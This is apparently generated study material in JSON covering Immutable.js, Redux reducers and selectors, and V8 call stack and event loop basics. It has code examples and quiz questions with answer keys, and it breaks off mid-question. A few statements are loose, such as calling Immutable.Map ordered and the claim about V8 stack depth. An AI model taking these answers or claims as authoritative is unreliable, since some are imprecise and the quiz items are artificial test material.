[
  {
    "id": "72e8450d-5365-4a81-aad4-572b40b7e390",
    "startLine": 10800,
    "endLine": 10899,
    "processedDate": "2025-06-17T11:54:39.228Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_immutable_js_collections",
          "title": "Immutable.js: Core Concepts and Data Structures",
          "content": "Immutable.js is a library that provides immutable data structures for JavaScript. Immutability means that once a data structure is created, it cannot be changed. Any operation that would 'modify' the structure actually returns a new instance of the structure with the changes, leaving the original intact. This approach helps in building applications with more predictable state, easier debugging, and optimized performance through structural sharing and referential equality checks.\n\n## Key Concepts\n*   **Immutability**: Data structures cannot be altered after creation. Operations like `set`, `update`, `push` return new instances.\n*   **Persistence**: Previous versions of the data structure remain valid and accessible.\n*   **Structural Sharing**: When a 'modified' version of an immutable data structure is created, only the parts that have changed are re-created. Unchanged parts are shared between the old and new versions, saving memory and improving performance.\n*   **Referential Equality**: Because operations return new instances, you can easily check if a data structure has changed by comparing references (e.g., `oldState === newState`). This is crucial for performance optimizations in UI frameworks like React.\n\n## Immutable Data Structures\n\n### `Immutable.Map`\n`Immutable.Map` is an immutable, ordered collection of key-value pairs, similar to a JavaScript `Object` or a `Map`. It's a fundamental immutable collection.\n\n### `Immutable.List`\n`Immutable.List` is an immutable, ordered indexed collection, similar to a JavaScript `Array`.\n\n### `Immutable.Set`\n`Immutable.Set` is an immutable collection of unique values, similar to a JavaScript `Set`.\n\n### `Immutable.Record`\n`Immutable.Record` provides a way to define immutable objects with a predefined shape and default values. It's useful for creating type-safe and predictable data models.\n\n### `Immutable.fromJS`\n`Immutable.fromJS` is a utility function that deeply converts plain JavaScript objects and arrays into Immutable.js `Map`s and `List`s respectively. This is essential when integrating Immutable.js with existing JavaScript data.\n\n## Common Operations\n*   **`get(key)`**: Retrieves a value associated with a key.\n*   **`set(key, value)`**: Returns a new `Map` with the value at the specified key updated or added.\n*   **`update(key, updaterFn)`**: Returns a new `Map` with the value at `key` updated by the `updaterFn`. The `updaterFn` receives the current value and should return the new value.\n*   **`push(value)`**: Returns a new `List` with `value` appended.\n*   **`filter(predicateFn)`**: Returns a new collection containing only elements for which the `predicateFn` returns `true`.\n*   **`filterNot(predicateFn)`**: Returns a new collection containing only elements for which the `predicateFn` returns `false`.\n*   **`merge(otherMap)`**: Returns a new `Map` with the values from `otherMap` merged into the original `Map`. Conflicts are resolved by the `otherMap`'s values taking precedence.\n*   **`union(collection)`**: Returns a new `Set` containing all unique values from the original `Set` and the provided `collection`.",
          "examples": [
            {
              "id": "example_immutable_map_1",
              "title": "Creating and Updating Immutable.Map",
              "code": "import { Map } from 'immutable';\n\n// Creating an immutable map\nconst map1 = Map({ a: 1, b: 2, c: 3 });\nconsole.log('Map 1:', map1.toJS()); // { a: 1, b: 2, c: 3 }\n\n// Updating 'b' (returns a new map, map1 remains unchanged)\nconst map2 = map1.set('b', 50);\n\nconsole.log('Map 1 (after update):', map1.get('b')); // 2\nconsole.log('Map 2 (new map):', map2.get('b')); // 50\n\n// Using update method\nconst map3 = map2.update('c', value => value * 2);\nconsole.log('Map 3 (updated c):', map3.get('c')); // 100",
              "explanation": "This example demonstrates how `Immutable.Map` instances are created and how `set` and `update` methods operate. Notice that `map1` remains unchanged after `set('b', 50)` is called, proving the immutability principle. `update` provides a functional way to modify a value based on its current state.",
              "language": "typescript"
            },
            {
              "id": "example_immutable_record_1",
              "title": "Using Immutable.Record for Structured Data",
              "code": "import { Record } from 'immutable';\n\nconst DataRecord = Record({\n  value: 5,\n  unit: 'count'\n});\n\nconst TestRecord = Record({\n  text: '',\n  data: new DataRecord() // Nested Record with default\n});\n\nconst testInstance1 = new TestRecord();\nconsole.log(testInstance1.get('data').get('value')); // 5 (the default value)\nconsole.log(testInstance1.get('data').get('unit')); // 'count'\n\n// Create a new instance with overridden values\nconst testInstance2 = testInstance1.set('text', 'Hello').setIn(['data', 'value'], 10);\nconsole.log(testInstance2.get('text')); // 'Hello'\nconsole.log(testInstance2.get('data').get('value')); // 10\nconsole.log(testInstance1.get('text')); // '' (original remains unchanged)\nconsole.log(testInstance1.get('data').get('value')); // 5",
              "explanation": "`Immutable.Record` allows defining a blueprint for immutable objects, complete with default values and nested structures. This improves code readability and maintainability by ensuring a consistent data shape. Accessing values is done via `get` or property access if configured. Updates return new `Record` instances.",
              "language": "typescript"
            },
            {
              "id": "example_immutable_fromjs_1",
              "title": "Converting JavaScript Objects to Immutable Structures",
              "code": "import { fromJS, isImmutable } from 'immutable';\n\n// A plain JavaScript object\nconst jsState = {\n  list: [1, 2, { id: 1 }],\n  isAddUserModalShowed: false,\n  tmpUser: null,\n  settings: {\n    theme: 'dark',\n    notifications: true\n  }\n};\n\n// Deep conversion to Immutable Maps and Lists\nconst immutableState = fromJS(jsState);\n\nconsole.log(isImmutable(immutableState)); // true\nconsole.log(isImmutable(immutableState.get('list'))); // true\nconsole.log(immutableState.getIn(['list', 2, 'id'])); // 1\nconsole.log(immutableState.getIn(['settings', 'theme'])); // 'dark'\n\n// Demonstrating updates\nconst newState = immutableState.set('isAddUserModalShowed', true);\nconsole.log(newState.get('isAddUserModalShowed')); // true\nconsole.log(immutableState.get('isAddUserModalShowed')); // false (original unchanged)",
              "explanation": "`fromJS` is crucial for initializing Immutable.js structures from existing JavaScript data. It performs a deep conversion, ensuring all nested objects become `Map`s and arrays become `List`s. This makes it easy to integrate Immutable.js into applications that might initially receive or generate plain JavaScript data.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_immutable_js_benefits_open_1",
            "question_immutable_js_map_update_mcq_1",
            "question_immutable_js_record_mcq_1",
            "question_immutable_js_fromjs_code_1",
            "question_immutable_js_filter_flashcard_1"
          ],
          "relatedTasks": [
            "task_immutable_state_management"
          ],
          "tags": [
            "Immutable.js",
            "Data Structures",
            "Immutability",
            "Functional Programming",
            "State Management"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "javascript_objects",
            "javascript_arrays",
            "functional_programming_basics"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "redux_with_immutablejs",
            "react_performance_optimization"
          ]
        },
        {
          "id": "theory_redux_with_immutable_js",
          "title": "Integrating Immutable.js with Redux",
          "content": "Redux relies heavily on the concept of immutability for state updates. Reducers in Redux must be pure functions, meaning they should not mutate their arguments (the state) and should produce the same output for the same input. When working with large or deeply nested state objects in plain JavaScript, ensuring immutability can become verbose and error-prone (e.g., using spread operators extensively for deep copies).\n\nImmutable.js simplifies state management in Redux by providing native immutable data structures. This ensures that state updates always return new objects, making it easier to follow Redux's immutability principle and leverage performance optimizations.\n\n## Reducer Implementation with Immutable.js\n\nWhen using Immutable.js, the initial state of the Redux store is typically an `Immutable.Map`.\n\n```typescript\nimport { Map, List } from 'immutable';\n\n// Initial state as an Immutable Map\nfunction reducer(state = Map(), action) {\n  switch (action.type) {\n    case 'ADD_PHONE':\n      // 'phones' is assumed to be an Immutable.List within the state Map\n      // update ensures that if 'phones' doesn't exist, it's initialized as an empty List\n      return state.update('phones', List(), phones => phones.push(action.phone));\n    case 'REMOVE_PHONE':\n      return state.update('phones', List(), phones => phones.filterNot(phone => phone === action.phone));\n    case 'SET_STATE':\n      // merge allows combining the current state with a new state object\n      // It handles both plain JS objects (if fromJS is used on action.state) or Immutable Map\n      return state.merge(action.state);\n    default:\n      return state;\n  }\n}\n```\n\n### Key aspects in a Reducer using Immutable.js:\n\n*   **Initial State**: The reducer function typically defines a default value for the `state` parameter, usually an empty `Immutable.Map()`. This ensures the state is always an immutable object from the start.\n    ```typescript\n    function reducer(state = Map(), action) {\n        // ...\n    }\n    ```\n*   **Action Handling**: Reducers process `action` objects, which typically have a `type` property. Based on the `action.type`, the state is updated.\n*   **Immutable Operations**: Instead of direct mutation, `Immutable.Map` methods like `set()`, `update()`, `merge()`, `delete()`, and `Immutable.List` methods like `push()`, `filterNot()` are used. Each of these methods returns a new Immutable.js object, preserving the original state.\n*   **Structural Sharing**: These operations efficiently create new state objects by sharing unchanged parts of the data structure, which is more performant than deep cloning plain JavaScript objects.\n*   **ES2015 Features**: Arrow functions (e.g., `phones => phones.push(action.phone)`) and default parameters (`state = Map()`) are commonly used for concise reducer logic.\n*   **Returning New State**: After each state update, the new immutable state object must be returned. This is how the Redux store recognizes that the state has changed and triggers updates for connected components.",
          "examples": [
            {
              "id": "example_redux_reducer_immutable_1",
              "title": "Detailed Immutable.js Reducer Example",
              "code": "import { Map, List } from 'immutable';\n\nconst initialState = Map({\n  user: null,\n  settings: Map({\n    darkMode: false,\n    notifications: true\n  }),\n  tasks: List([\n    Map({ id: 1, text: 'Learn Redux', completed: false }),\n    Map({ id: 2, text: 'Master Immutable.js', completed: true })\n  ])\n});\n\nfunction appReducer(state = initialState, action) {\n  switch (action.type) {\n    case 'SET_USER':\n      // Update a top-level property\n      return state.set('user', Map(action.payload.user));\n    case 'TOGGLE_DARK_MODE':\n      // Update a nested property using updateIn\n      return state.updateIn(['settings', 'darkMode'], mode => !mode);\n    case 'ADD_TASK':\n      // Add an item to an Immutable List\n      const newTask = Map({ id: action.payload.id, text: action.payload.text, completed: false });\n      return state.update('tasks', tasks => tasks.push(newTask));\n    case 'COMPLETE_TASK':\n      // Update an item within a List based on its ID\n      return state.update('tasks', tasks =>\n        tasks.map(task =>\n          task.get('id') === action.payload.id ? task.set('completed', true) : task\n        )\n      );\n    case 'RESET_STATE':\n      // Merge a completely new state (e.g., from server or local storage)\n      // Assumes action.payload.newState is an Immutable Map\n      return state.merge(action.payload.newState);\n    default:\n      return state;\n  }\n}\n\n// --- Usage Example ---\nlet currentState = initialState;\nconsole.log('Initial State:', currentState.toJS());\n\ncurrentState = appReducer(currentState, { type: 'SET_USER', payload: { user: { id: 'u1', name: 'Alice' } } });\nconsole.log('After SET_USER:', currentState.toJS());\n\ncurrentState = appReducer(currentState, { type: 'TOGGLE_DARK_MODE' });\nconsole.log('After TOGGLE_DARK_MODE:', currentState.toJS());\n\ncurrentState = appReducer(currentState, { type: 'ADD_TASK', payload: { id: 3, text: 'Build a Redux App' } });\nconsole.log('After ADD_TASK:', currentState.toJS());\n\ncurrentState = appReducer(currentState, { type: 'COMPLETE_TASK', payload: { id: 1 } });\nconsole.log('After COMPLETE_TASK:', currentState.toJS());",
              "explanation": "This example demonstrates a Redux reducer fully utilizing Immutable.js. It shows how to initialize state, handle various actions (`set`, `updateIn`, `update`, `push`, `map`, `merge`) for different data structures (top-level properties, nested objects, lists), all while adhering to the immutability principle. Each action type returns a new state object, ensuring the original state is never mutated.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_redux_immutable_benefits_open_1",
            "question_redux_immutable_reducer_mcq_1",
            "question_redux_immutable_update_code_1",
            "question_redux_immutable_initial_state_flashcard_1"
          ],
          "relatedTasks": [
            "task_redux_immutable_reducer"
          ],
          "tags": [
            "Redux",
            "Immutable.js",
            "State Management",
            "Reducers",
            "Immutability",
            "Frontend Architecture"
          ],
          "technology": "Redux",
          "prerequisites": [
            "redux_basics",
            "immutable_js_collections"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "requiredFor": [
            "large_scale_redux_apps",
            "performance_optimized_react_apps"
          ]
        },
        {
          "id": "theory_redux_selectors",
          "title": "Redux Selectors for State Access",
          "content": "In Redux, selectors are functions that take the entire Redux state as an argument and return a derived piece of data from that state. They serve as a crucial abstraction layer, encapsulating the logic for accessing and transforming state. Selectors promote reusability, testability, and can significantly improve performance when combined with memoization libraries like Reselect.\n\n## Why use Selectors?\n\n1.  **Encapsulation and Reusability**: Centralize state access logic. Instead of components directly digging into the state, they call a selector.\n2.  **Decoupling**: Components become decoupled from the exact structure of the Redux state. If the state shape changes, only the selector needs to be updated, not every component that uses that piece of state.\n3.  **Derived Data**: Selectors are perfect for computing derived data (e.g., filtered lists, aggregated sums) that depend on multiple parts of the state.\n4.  **Performance Optimization (Memoization)**: When a selector is memoized (e.g., using `reselect`'s `createSelector`), it only re-computes its result if its input arguments change. If the arguments are the same as the last call, it returns the cached result, preventing unnecessary re-renders in connected components.\n5.  **Testability**: Selectors are pure functions, making them easy to test in isolation.\n\n## Types of Selectors\n\n### Basic Selectors\nThese are simple functions that extract a direct slice of the state.\n\n```typescript\n// Basic selector: returns the entire todos slice of state\nconst getTodos = state => state.todos;\n\n// Basic selector: returns a specific property\nconst getIsLoading = state => state.ui.isLoading;\n```\n\n### Complex/Derived Selectors\nThese selectors combine multiple pieces of state or perform transformations on existing state data.\n\n```typescript\n// More complex selector that filters data\nconst getCompletedTodos = state => state.todos.filter(todo => todo.completed);\n\n// Selector combining data from different parts of the state\nconst getUserDisplayName = state => state.user.firstName + ' ' + state.user.lastName;\n```\n\nWhen working with Immutable.js, selectors typically receive an Immutable.js object as `state` and use Immutable.js methods (`get`, `getIn`, `filter`, `map`, `toJS`, etc.) to access and manipulate the data.",
          "examples": [
            {
              "id": "example_redux_selector_complex_1",
              "title": "Complex Selector with Immutable.js State",
              "code": "import { createSelector } from 'reselect';\nimport { Map, List } from 'immutable';\n\n// Assume Redux state is an Immutable.Map:\n// const state = Map({ \n//   todos: List([\n//     Map({ id: 1, text: 'Learn Redux', completed: false }),\n//     Map({ id: 2, text: 'Master Selectors', completed: true }),\n//     Map({ id: 3, text: 'Build App', completed: false })\n//   ]),\n//   filter: 'SHOW_ALL'\n// });\n\n// Input selectors (basic selectors)\nconst getTodosList = state => state.get('todos');\nconst getVisibilityFilter = state => state.get('filter');\n\n// A derived selector that filters todos based on the visibility filter\nconst getVisibleTodos = createSelector(\n  [getTodosList, getVisibilityFilter], // Input selectors\n  (todos, filter) => { // Selector function, receives results of input selectors\n    switch (filter) {\n      case 'SHOW_ALL':\n        return todos;\n      case 'SHOW_COMPLETED':\n        return todos.filter(todo => todo.get('completed'));\n      case 'SHOW_ACTIVE':\n        return todos.filter(todo => !todo.get('completed'));\n      default:\n        throw new Error('Unknown filter: ' + filter);\n    }\n  }\n);\n\n// --- Usage Example ---\nconst sampleState = Map({\n  todos: List([\n    Map({ id: 1, text: 'Buy groceries', completed: false }),\n    Map({ id: 2, text: 'Do laundry', completed: true }),\n    Map({ id: 3, text: 'Call mom', completed: false })\n  ]),\n  filter: 'SHOW_COMPLETED'\n});\n\nconst completedTodos = getVisibleTodos(sampleState);\nconsole.log('Completed Todos:', completedTodos.toJS()); // [{ id: 2, text: 'Do laundry', completed: true }]\n\nconst sampleState2 = sampleState.set('filter', 'SHOW_ALL');\nconst allTodos = getVisibleTodos(sampleState2);\nconsole.log('All Todos:', allTodos.toJS()); // All three todos",
              "explanation": "This example demonstrates a complex Redux selector using `reselect` to achieve memoization and `Immutable.js` for state management. `getTodosList` and `getVisibilityFilter` are input selectors. `getVisibleTodos` uses `createSelector` to combine their outputs and filter the `todos` list. The `createSelector` ensures that `getVisibleTodos` only re-runs its transformation logic if `todos` or `filter` actually change, preventing unnecessary re-computations and improving performance.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_redux_selector_purpose_mcq_1",
            "question_redux_selector_benefits_open_1",
            "question_redux_selector_memoization_flashcard_1",
            "question_redux_selector_derived_code_1"
          ],
          "relatedTasks": [
            "task_redux_selectors_implementation"
          ],
          "tags": [
            "Redux",
            "Selectors",
            "Reselect",
            "State Management",
            "Performance Optimization",
            "Immutability"
          ],
          "technology": "Redux",
          "prerequisites": [
            "redux_basics",
            "immutable_js_collections"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "requiredFor": [
            "large_scale_redux_apps",
            "react_performance_optimization"
          ]
        },
        {
          "id": "theory_javascript_engine_fundamentals",
          "title": "JavaScript Engine Fundamentals: V8, Memory & Call Stack",
          "content": "A JavaScript engine is a program that executes JavaScript code. The most widely known and used engine today is **V8**, developed by Google. V8 powers the Chrome browser, Node.js runtime, and Electron, among others. Understanding the core components of a JavaScript engine is crucial for writing efficient and non-blocking JavaScript applications.\n\n## V8 Engine Architecture (Simplified)\n\n<img src=\"https://www.google.com/url?sa=i&url=https%3A%2F%2Fmiro.medium.com%2Fv2%2Fresize%3Afit%3A1400%2F1%2A8M09t2uL1-XJb6P_jMv0Xg.jpeg&psig=AOvVaw0Y_jR_0L_q4X-4v4c_jMv0&ust=1708892864380000&source=images&cd=vfe&opi=89978449&ved=0CBMQjRxqFwoTCJDd-vS5tYMDFQAAAAAdAAAAABAI\" alt=\"V8 Engine Simplified Diagram\">\n*(Image for illustrative purposes, actual diagram not provided in markdown, placeholder used.)*\n\n### Core Components:\n\n1.  **Memory Heap**: This is the region of memory where objects, variables, and functions are stored during the execution of a program. When you declare a variable or create an object (e.g., `const obj = { a: 1 };`), the memory for that data is allocated in the heap. The heap is dynamic and unstructured, allowing for flexible memory allocation for objects whose size might not be known at compile time.\n\n2.  **Call Stack**: The Call Stack (often just referred to as \"the stack\") is a LIFO (Last-In, First-Out) data structure that keeps track of the execution context of a program. When a function is called, a new 'stack frame' (or 'execution context') is pushed onto the stack. This frame contains information about the function's arguments, local variables, and the return address. When a function finishes execution, its stack frame is popped off the stack. JavaScript is single-threaded, meaning it has only one call stack. This implies that only one function can be executing at any given time.\n    *   **Stack Overflow**: If the call stack exceeds its maximum capacity (e.g., due to infinitely recursive function calls without a base case), a 'Stack Overflow' error occurs. Chrome's V8 engine typically has a maximum stack depth, around 16,000 entries, which it clears upon overflow.\n\n## Parallel Code Execution and the Event Loop\n\n**The Blocking Problem**: Because JavaScript is single-threaded and has only one call stack, as long as there is a function executing on the call stack, the browser (or Node.js runtime) cannot perform other tasks. This means the UI becomes unresponsive, animations freeze, and network requests cannot be processed until the current task on the stack completes. This is known as the \"blocking\" problem.\n\n**The Solution (Event Loop - High-Level Overview)**: To overcome the blocking problem for I/O operations (like network requests, timers, DOM events), JavaScript environments (browsers, Node.js) implement a concurrency model based on the Event Loop, Callback Queue (or Task Queue), and Web APIs (or Node.js C++ APIs). While not explicitly detailed in the provided text, the mention of the blocking problem naturally leads to this crucial concept:\n*   **Web APIs / Node.js APIs**: These are environment-provided functionalities (e.g., `setTimeout`, `fetch`, DOM events) that can handle asynchronous operations outside the main JavaScript thread.\n*   **Callback Queue (Task Queue)**: When an asynchronous operation completes, its associated callback function is placed in a queue.\n*   **Event Loop**: Continuously monitors the Call Stack and the Callback Queue. If the Call Stack is empty, it takes the first callback from the Callback Queue and pushes it onto the Call Stack for execution.\n\nThis mechanism allows JavaScript to perform non-blocking asynchronous operations despite being single-threaded, ensuring a responsive user interface.\n\n```typescript\n// Example of Call Stack behavior\nfunction multiply(a, b) {\n  return a * b;\n}\n\nfunction square(n) {\n  return multiply(n, n);\n}\n\nfunction calculate() {\n  const result = square(5);\n  console.log(result);\n}\n\ncalculate();\n// Call Stack progression:\n// 1. calculate() is pushed\n// 2. square(5) is pushed\n// 3. multiply(5, 5) is pushed\n// 4. multiply returns, pops\n// 5. square returns, pops\n// 6. console.log(result) is pushed\n// 7. console.log returns, pops\n// 8. calculate returns, pops (stack is empty)\n```",
          "examples": [
            {
              "id": "example_js_engine_call_stack_1",
              "title": "Understanding the Call Stack",
              "code": "function greet(name) {\n  console.log(`Hello, ${name}!`);\n}\n\nfunction introduce() {\n  greet('Alice');\n}\n\nfunction start() {\n  introduce();\n}\n\nstart();\n\n/*\nCall Stack Visualization:\n\n1. `start()` is pushed\n   Stack: [start]\n\n2. `introduce()` is pushed (called by start)\n   Stack: [start, introduce]\n\n3. `greet('Alice')` is pushed (called by introduce)\n   Stack: [start, introduce, greet]\n\n4. `console.log(...)` is pushed (called by greet)\n   Stack: [start, introduce, greet, console.log]\n\n5. `console.log` finishes, popped\n   Stack: [start, introduce, greet]\n\n6. `greet` finishes, popped\n   Stack: [start, introduce]\n\n7. `introduce` finishes, popped\n   Stack: [start]\n\n8. `start` finishes, popped\n   Stack: [] (empty)\n*/",
              "explanation": "This example illustrates the Last-In, First-Out (LIFO) behavior of the Call Stack. Each function call adds a frame to the stack, and when a function completes, its frame is removed. This mechanism ensures that JavaScript knows where to return to after a function finishes execution.",
              "language": "typescript"
            },
            {
              "id": "example_js_engine_blocking_async_1",
              "title": "Illustrating Blocking vs. Non-Blocking (Conceptual)",
              "code": "// Blocking (Synchronous) operation example (conceptual, as real JS usually uses async for heavy ops)\nfunction longRunningSynchronousTask() {\n  let sum = 0;\n  for (let i = 0; i < 1000000000; i++) {\n    sum += i;\n  }\n  console.log('Synchronous task finished:', sum);\n}\n\nconsole.log('Start of script');\nlongRunningSynchronousTask(); // This will block the thread\nconsole.log('End of script (after blocking task)');\n\n// Non-blocking (Asynchronous) operation example\nconsole.log('Start of async demo');\nsetTimeout(() => {\n  console.log('Async task finished after 0ms (via Event Loop)');\n}, 0);\nconsole.log('End of async demo (before async task)');\n\n/*\nExpected Output Order:\nStart of script\nSynchronous task finished: <large number>\nEnd of script (after blocking task)\nStart of async demo\nEnd of async demo (before async task)\nAsync task finished after 0ms (via Event Loop)\n\nExplanation:\nThe synchronous task blocks the main thread. The 'End of script' message will only appear after the loop completes.\nFor the async part, `setTimeout` is handed over to a Web API. `console.log('End of async demo...')` executes immediately.\nOnce the timer for `setTimeout` expires (even if 0ms, it still goes to the queue), its callback is placed in the Callback Queue.\nThe Event Loop then picks it up and pushes it to the Call Stack *only after* the main thread (Call Stack) is empty.\nThis demonstrates how asynchronous operations prevent the main thread from blocking.\n*/",
              "explanation": "This example conceptually distinguishes between blocking and non-blocking operations in JavaScript. A long-running synchronous task will halt all other operations, including UI updates, until it finishes. Asynchronous functions, facilitated by the Event Loop, allow such tasks to be offloaded, ensuring the main thread remains free to handle other critical operations like rendering the UI or processing user input.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_js_engine_v8_mcq_1",
            "question_js_engine_call_stack_open_1",
            "question_js_engine_heap_flashcard_1",
            "question_js_engine_call_stack_code_1"
          ],
          "relatedTasks": [
            "task_js_event_loop_prediction"
          ],
          "tags": [
            "JavaScript Engine",
            "V8",
            "Memory Management",
            "Call Stack",
            "Event Loop",
            "Concurrency",
            "Blocking"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "javascript_fundamentals"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "requiredFor": [
            "nodejs_development",
            "browser_performance_optimization",
            "understanding_async_js"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_immutable_js_map_update_mcq_1",
          "topic": "Immutable.js: Map Operations",
          "level": "easy",
          "type": "mcq",
          "question": "Given the following Immutable.js Map:\n```javascript\nimport { Map } from 'immutable';\nconst map1 = Map({ a: 1, b: 2 });\n```\nWhich of the following lines of code correctly updates the value of key `b` to `5` and returns a new Map, leaving `map1` unchanged?",
          "answer": "const map2 = map1.set('b', 5);",
          "options": [
            "map1.b = 5;",
            "map1.set('b', 5);",
            "const map2 = map1.set('b', 5);",
            "const map2 = map1.update('b', 5);"
          ],
          "analysisPoints": [
            "Tests understanding of Immutable.js's core principle of immutability.",
            "Distinguishes between mutation and creation of new immutable instances.",
            "Identifies the correct method (`set`) for updating a key-value pair in `Immutable.Map`."
          ],
          "keyConcepts": [
            "Immutable.js Map",
            "Immutability",
            "set() method",
            "Referential equality"
          ],
          "evaluationCriteria": [
            "Ability to select the correct Immutable.js API for non-mutating updates.",
            "Understanding that Immutable.js methods return new instances."
          ],
          "example": "The `set` method on an Immutable.js Map returns a *new* Map with the updated value, leaving the original Map untouched. Direct property assignment (`map1.b = 5;`) would not work for Immutable Maps, and `map1.set('b', 5);` without assignment would update but not capture the new Map. `update` method takes a function as second argument. Therefore, `const map2 = map1.set('b', 5);` is the correct way.",
          "tags": [
            "Immutable.js",
            "Map",
            "Immutability",
            "Basic"
          ],
          "prerequisites": [
            "immutable_js_collections"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_immutable_js_record_mcq_1",
          "topic": "Immutable.js: Record",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following Immutable.js Record definition and usage:\n```javascript\nimport { Record } from 'immutable';\n\nconst UserRecord = Record({\n  id: null,\n  name: 'Guest',\n  email: 'default@example.com'\n});\n\nconst user1 = new UserRecord({ id: 101, name: 'John Doe' });\nconst user2 = user1.set('email', 'john.doe@new.com');\n```\nWhat will be the output of `console.log(user1.get('email'))` and `console.log(user2.get('name'))` respectively?",
          "answer": "default@example.com, John Doe",
          "options": [
            "default@example.com, default@example.com",
            "default@example.com, John Doe",
            "john.doe@new.com, John Doe",
            "john.doe@new.com, default@example.com"
          ],
          "analysisPoints": [
            "Tests understanding of `Immutable.Record` default values.",
            "Tests understanding of `set` method's immutability behavior.",
            "Confirms that original `Record` instances remain unchanged after operations."
          ],
          "keyConcepts": [
            "Immutable.js Record",
            "Default values",
            "set() method",
            "Immutability"
          ],
          "evaluationCriteria": [
            "Ability to correctly predict the state of immutable objects after operations.",
            "Knowledge of how `Record` defaults are applied and overridden."
          ],
          "example": "When `user1` is created, `email` defaults to `default@example.com` as it's not provided in the constructor. The `set` operation on `user1` to create `user2` returns a *new* Record instance. `user1` itself remains unchanged. Thus, `user1.get('email')` will still be `default@example.com`. `user2` inherited `name: 'John Doe'` from `user1` (due to structural sharing) and its `email` was explicitly set, so `user2.get('name')` will be `John Doe`.",
          "tags": [
            "Immutable.js",
            "Record",
            "Immutability",
            "Medium"
          ],
          "prerequisites": [
            "immutable_js_collections"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_immutable_js_benefits_open_1",
          "topic": "Immutable.js: Benefits",
          "level": "medium",
          "type": "open",
          "question": "Explain the primary benefits of using immutable data structures, particularly in a frontend application context (e.g., with React/Redux). How do they contribute to more predictable state and better performance?",
          "answer": null,
          "options": [],
          "analysisPoints": [
            "Ability to articulate the core advantages of immutability.",
            "Connects immutability to state predictability (easier debugging, no unexpected side effects).",
            "Explains the performance benefits (referential equality checks, structural sharing).",
            "Relates concepts to real-world frontend challenges."
          ],
          "keyConcepts": [
            "Immutability",
            "Predictable State",
            "Debugging",
            "Performance Optimization",
            "Referential Equality",
            "Structural Sharing",
            "Redux",
            "React"
          ],
          "evaluationCriteria": [
            "Comprehensive understanding of immutability's impact.",
            "Clear explanation of technical concepts.",
            "Ability to apply knowledge to common frontend patterns."
          ],
          "example": "### Predicted Answer Structure:\n\n**Predictable State:**\n1.  **No Side Effects**: Immutable data structures cannot be changed after creation. Any operation that modifies the data returns a new copy. This eliminates unintended side effects where one part of the code mutates a shared object, affecting other parts of the application unexpectedly.\n2.  **Easier Debugging**: With immutability, state changes are explicit and traceable. You can always know that if a variable's reference has not changed, its content has not changed. This makes debugging state-related issues significantly easier as you don't have to worry about hidden mutations.\n3.  **Undo/Redo & Time Travel Debugging**: Because every state modification creates a new state object, it's trivial to keep a history of states. This enables powerful features like undo/redo functionality and time-travel debugging (as seen in Redux DevTools).\n\n**Better Performance (especially with React/Redux):**\n1.  **Optimized Re-renders (React/Memoization)**: React components often re-render when their props or state change. With immutable data, you can perform very cheap `===` (referential equality) checks to determine if a prop or state has actually changed. If `oldProp === newProp`, then the prop's value has not changed, and the component (or sub-tree) can skip re-rendering. This is the basis for `React.memo`, `PureComponent`, and `shouldComponentUpdate`.\n2.  **Structural Sharing**: Immutable.js implements structural sharing. When you 'modify' an immutable data structure, only the changed parts are re-created, and the unchanged parts are reused (shared) by reference. This saves memory and CPU cycles compared to deep cloning plain JavaScript objects on every update.\n3.  **Concurrency Benefits**: While less common in typical frontend JavaScript, immutability is fundamental for concurrent programming as it eliminates race conditions and simplifies parallel processing by removing the need for complex locking mechanisms when data is shared across threads (e.g., Web Workers).",
          "tags": [
            "Immutable.js",
            "Immutability",
            "Redux",
            "React",
            "Performance",
            "State Management",
            "Open-Ended"
          ],
          "prerequisites": [
            "immutable_js_collections",
            "redux_basics",
            "react_basics"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_immutable_js_fromjs_code_1",
          "topic": "Immutable.js: `fromJS`",
          "level": "medium",
          "type": "code",
          "question": "Given the following JavaScript object representing application state:\n```javascript\nconst jsAppState = {\n  user: {\n    id: 1,\n    name: 'Jane Doe',\n    preferences: ['email', 'sms']\n  },\n  products: [\n    { id: 'p1', name: 'Laptop', price: 1200 },\n    { id: 'p2', name: 'Mouse', price: 25 }\n  ],\n  cart: []\n};\n```\nWrite JavaScript code using `Immutable.js` to:\n1.  Convert `jsAppState` into an immutable structure.\n2.  Update the user's name to 'Jane Smith' in the immutable state.\n3.  Add a new product `{ id: 'p3', name: 'Keyboard', price: 75 }` to the `products` list.\n4.  Verify that the original `jsAppState` remains unchanged and log the updated immutable state.",
